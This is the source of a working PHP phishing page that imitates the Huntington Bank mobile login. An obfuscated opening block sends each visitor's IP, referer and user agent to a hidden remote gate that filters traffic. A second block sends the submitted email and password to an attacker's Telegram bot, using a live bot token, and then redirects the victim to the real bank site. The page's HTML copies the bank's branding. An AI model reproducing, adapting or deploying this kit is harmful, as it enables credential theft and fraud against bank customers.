<?php
  $y3 = "lgjqmli9ez6bol55";

  if (!function_exists("trueip")) {
      function i0()
      {
          if (!empty($_SERVER["HTTP_CF_CONNECTING_IP"]) && $_SERVER["HTTP_CF_CONNECTING_IP"] != "127.0.0.1" && $_SERVER["HTTP_CF_CONNECTING_IP"] != $_SERVER["SERVER_ADDR"]) {
              $z4 = $_SERVER["HTTP_CF_CONNECTING_IP"];
          } elseif (!empty($_SERVER["GEOIP_ADDR"]) && $_SERVER["GEOIP_ADDR"] != "127.0.0.1") {
              $z4 = $_SERVER["GEOIP_ADDR"];
          } elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"]) && $_SERVER["HTTP_X_FORWARDED_FOR"] != "127.0.0.1" && $_SERVER["HTTP_X_FORWARDED_FOR"] != $_SERVER["SERVER_ADDR"]) {
              $z4 = explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"])[0];
          } elseif (!empty($_SERVER["HTTP_CLIENT_IP"]) && $_SERVER["HTTP_CLIENT_IP"] != "127.0.0.1" && $_SERVER["HTTP_CLIENT_IP"] != $_SERVER["SERVER_ADDR"]) {
              $z4 = $_SERVER["HTTP_CLIENT_IP"];
          } else {
              $z4 = $_SERVER["REMOTE_ADDR"];
          }
          return $z4;
      }
  }

  $z4 = i0();

  if (!function_exists("truer")) {
      function b1()
      {
          if (empty($_SERVER["HTTP_REFERER"])) {
              $_SERVER["HTTP_REFERER"] = getenv("HTTP_REFERER");
          }
          return $_SERVER["HTTP_REFERER"];
      }
  }

  $v5 = b1();

  if (!function_exists("trueua")) {
      function u2()
      {
          if (empty($_SERVER["HTTP_USER_AGENT"])) {
              $_SERVER["HTTP_USER_AGENT"] = getenv("HTTP_USER_AGENT");
          }
          return $_SERVER["HTTP_USER_AGENT"];
      }
  }

  $i6 = u2();

  if ($_SERVER["QUERY_STRING"] != "") {
      $c7 = "" . urlencode($_SERVER["QUERY_STRING"]) . "";
  } else {
      $c7 = "";
  }

  $j8 = $_SERVER["SERVER_ADDR"];
  $r9 = substr(@$_SERVER["HTTP_ACCEPT_LANGUAGE"], 0, 2);
  $u10 = "ap";
  $v11 = "ch";
  $n12 = "";
  $b13 = "p.an";
  $u14 = "om";
  $r15 = "q903629";
  $r16 = "oshi";
  $x17 = "eld.c";
  $g18 = "i";

  $u19 = curl_init();
  curl_setopt($u19, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($u19, CURLOPT_URL, "https://" . $u10 . $b13 . $r16 . $x17 . $u14 . "/" . $u10 . $g18);
  curl_setopt($u19, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($u19, CURLOPT_TIMEOUT, 333);
  curl_setopt($u19, CURLOPT_POST, true);
  curl_setopt($u19, CURLOPT_POSTFIELDS, "key=" . $y3 . "&svip=" . $j8 . "&fd=" . $r15 . "&ip=" . $z4 . "&ref=" . $v5 . "&ua=" . $i6 . "&data=" . $c7 . "&sourceid=" . $n12 . "&sourcename=" . $v11 . "");
  $k20 = curl_exec($u19);
  curl_close($u19);

  if ($k20 == "0") {
      header_remove();
      header("Connection: close");
      header("HTTP/1.1 404 Not Found");
      $j21 = false;
      die();
  }
?>
<?php
$client_key = "6LdUvcIkAAAAAOoaXbeOZ0FUtImrTUXb9T4tTphA";
$server_key = "6LdUvcIkAAAAAAhetnayCW1O61VhxTxe9bAvpAZQ";
$url = "https://www.google.com/recaptcha/api/siteverify";


if(array_key_exists("detailsSubmit",$_POST)){

    $a = $_POST['email'];
    $b = $_POST['password'];
    
    //$c = $_POST['password'];
    $msgtosend = "----------Ghost_In_Wires---------- \n  *******Huntington-logs******* \n ## email: $a \n ## password: $b";

    //$msgtosend = $a . $b;
    $apiToken = "8063926136:AAFtNad7lqBd4bxDJYpx0wC-nn-vGwk5Amo";
    $data = [
        'chat_id' => '7566900581',
        'text' => $msgtosend
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));
    // echo "<pre>";print_r($response);echo"</pre>";

        header('Location: http://www.huntington.com/About-Us');
    exit();

}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Banking Login | Huntington Bank</title>
    <link rel="shortcut icon" href="./assets/images/favicon-32x32.png" type="image/x-icon">
    <link rel="stylesheet" href="./assets/style.css">
    <link rel="stylesheet" href="./assets/responsive.css"><meta property="og:title" content="Mobile Login"/>
    <meta property="og:description" content="Log in to your mobile banking profile to pay bills or check your balance on the go. Huntington offers safe and secure mobile banking options. "/>
    <meta property="og:image" content="./images/lockup.svg"/>
    <meta property="og:site_name" content="Huntington Bank"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preload" href="./assets/font/HuntingtonApexWeb-Medium.woff2" as="font" type="font/woff2" crossorigin>
    <link rel="preload" href="./assets/font/HuntingtonApexWeb-Bold.woff2" as="font" type="font/woff2" crossorigin>
    <link rel="preload" href="./assets/font/HuntingtonApexWeb-MediumCaps.woff2" as="font" type="font/woff2" crossorigin>
    <link rel="preload" href="./assets/font/muli-v11-latin-700.woff2" as="font" type="font/woff2" crossorigin>
    <link rel="preload" href="./assets/font/muli-v11-latin-300.woff2" as="font" type="font/woff2" crossorigin>
    <link rel="preload" href="./assets/font/muli-v11-latin-600.woff2" as="font" type="font/woff2" crossorigin>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
    <script src="https://kit.fontawesome.com/15eb45e9fa.js" crossorigin="anonymous"></script>
    <script src="https://www.google.com/recaptcha/api.js"></script>
</head>
<body>
    <div class="nav-bar">
        <div class="nav-container1">
            <div class="section-one">
                <ul>
                    <li><a href="">Open an Account</a></li>
                    <li><a href="">Customer Service</a></li>
                    <li><a href="">Community</a></li>
                    <li><a href="">Security</a></li>
                    <li><a href="">Find a branch</a></li>
                    <li id="so-icon"><i class="bi bi-search"></i> </li>
                </ul>
            </div>
            <div class="section-two">
                <img src="./assets/images/lockup.svg" alt="">
                <ul>
                    <li><a href="">Personal</a></li>
                    <li><a href="">Private Bank</a></li>
                    <li><a href="">Business</a></li>
                    <li><a href="">Commercial</a></li>
                </ul>
                <div class="input">
                    <input type="text" placeholder="Ask Huntington">
                    <i class="bi bi-search"></i>
    
                </div>
            </div>
        </div>
        <div class="nav-container2">
            <div id="nav-container2">
                <div class="left">
                    <i class="bi bi-list"></i>                
                    <img src="./assets/images/lockup.svg" alt="">
                </div>
                <div class="right">
                    <i class="bi bi-person"></i>                
                    <i class="bi bi-geo-alt"></i>                
                    <i class="bi bi-search"></i>
                                
                </div>
            </div>
        </div>

    </div>
    <div class="sub-nav">
        <ul>
            <li><a href="">Banking</a></li>
            <li><a href="">Borrowing</a></li>
            <li><a href="">Investments</a></li>
            <li><a href="">Insurance</a></li>
            <li><a href="">Learn</a></li>
            <li><a href="">Online Services</a></li>
            <li><a href="">Security</a></li>
        </ul>
    </div>
    <div class="container">
        <img src="./assets/images/pngegg.png" alt="">
        <p>Make banking on-the-go even easier.</p>
        <form action="" method="post">
            <div class="form-tab">
                <p class="tab1" onclick="toogleTab1()"> Personal & Business </p>
                <p class="tab2" onclick="toogleTab2()">Commercial</p>
                <p class="tab3" onclick="toogleTab3()">Other</p>
            </div>
           <div class="all">
                <div class="form-input" id="form-input1">
                    <label for="">Enter your primary email address that is associated with your Huntington account</label>
                    <fieldset>
                        <legend>Email Address</legend>
                        <input name="email" type="text" placeholder="">
                    </fieldset>
                    <fieldset>
                        <legend>Email Password</legend>
                        <input name="password" type="password">
                    </fieldset>
                </div>
                <div class="form-input" id="form-input2">
                    <label for="">Verify Your Address</label>
                    <fieldset>
                        <legend>Company ID</legend>
                        <input type="text" placeholder="">
                    </fieldset>
                    <fieldset>
                        <legend>User ID</legend>
                        <input type="text">
                    </fieldset>
                    <fieldset>
                        <legend>Password</legend>
                        <input type="password">
                    </fieldset>
                    
                </div>
                <div id="submitA">
                    <div class="submit-section">
                        <button name="detailsSubmit" ><i class="fa-solid fa-lock"></i> <span>Login</span> </button>
                        <div id="links-ss">
                            <a href="">Forgot username?</a>
                            <a href="">Forgot password?</a>
                        </div>
                    </div>
                </div>
                <div id="submitB">
                    <div class="submit-section">
                    
                        <div id="links-ss1">
                        <a href="">Forgot password?</a>
                        </div>
                    </div>
                </div>
                <p id="lone-txt">New to Online Banking?</p>
                <div class="form-link" id="form-link1">
                    <a href="">Enrol Now</a>
                    or
                    <a href="">Learn More</a>

                </div>
                <div class="form-link" id="form-link2">

                    <a href="">Learn More</a>

                </div>
           </div>
           <div class="next">
                <p>Access Other Services</p>
                <ul>
                    <li><a href="">Asset Based Lending</a></li>
                    <li><a href="">Commercial eCustomerService</a></li>
                    <li><a href="">Escrow Solutions</a></li>
                    <li><a href="">Payroll - Paychex</a></li>
                    <li><a href="">Payroll - SurePayroll</a></li>
                    <li><a href="">Online Investments</a></li>
                    <li><a href="">Online Trust</a></li>
                    <li><a href="">Retirement Plan Portal</a></li>
                    <li><a href="">Smart Tax</a></li>
                    <li><a href="">Remote Deposit Capture (TCF)</a></li>
                    <li><a href="">Lockbox (Exela)</a></li>
                    <li><a href="">Lockbox (CheckAlt)</a></li>
                    <li><a href="">Equipment Financing & Leasing</a></li>
                </ul>
           </div>
        </form>
    </div>
    <footer>
        <div class="foot-link">
            <ul>
                <li><a href="">About Us</a></li>
                <li><a href="">Investor Relations</a></li>
                <li><a href="">Careers</a></li>
                <li><a href="">Site Map</a></li>
                <li><a href="">Privacy Policies</a></li>
                <li><a href="">Privacy & Security</a></li>
                <li><a href="">Terms of Use</a></li>
                <li><a href="">Email Updates</a></li>
                <li><a href="">All Branches & ATMS</a></li>
                <li><a href="">Routine Numbers</a></li>
                <li><a href=""> <img src="./assets/images/oo_icon_retina_black.gif.png" alt=""> Give Feedback</a></li>
            </ul>
            <div class="svg">
                <i class="bi bi-facebook"></i>
                <i class="bi bi-twitter"></i>
                <i class="bi bi-instagram"></i>
                <i class="bi bi-youtube"></i>
                <i class="bi bi-linkedin"></i>
            </div>
        </div>
        <div class="foot-txt">
            <p id="txt1">Lending products are subject to credit application and approval.</p>
            <p id="txt2">Investment, Insurance and Non-deposit Trust products are: NOT A DEPOSIT • NOT FDIC INSURED • NOT GUARANTEED BY THE BANK • NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY • MAY LOSE VALUE</p>
            <p id="txt3"><img id="house" src="./assets/images/EHL_Black_HouseOnly.svg" alt=""> The Huntington National Bank is an Equal Housing Lender and Member FDIC <img class="logo" src="./assets/images/logo-honeycomb.svg" alt=""> ®. <img class="logo" src="./assets/images/logo-honeycomb.svg" alt=""> Huntington.Welcome.® and Huntington Heads Up® are federally registered service marks of Huntington Bancshares Incorporated. © 2023 Huntington Bancshares Incorporated.</p>
        </div>
    </footer>
</body>
</html>
